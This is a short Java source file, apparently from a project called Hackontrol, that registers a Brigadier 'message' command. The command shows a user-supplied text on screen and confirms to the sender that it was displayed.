package com.khopan.hackontrol.command;

import com.khopan.hackontrol.MessageDisplay;
import com.khopan.hackontrol.source.CommandSource;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;

public class MessageCommand implements Command {
	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("message").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.greedyString()).executes(context -> {
			CommandSource source = (CommandSource) context.getSource();
			String message = StringArgumentType.getString(context, "message");
			MessageDisplay.display(message);
			source.sendMessage("Successfully display the message: " + message);
			return 1;
		})));
	}
}
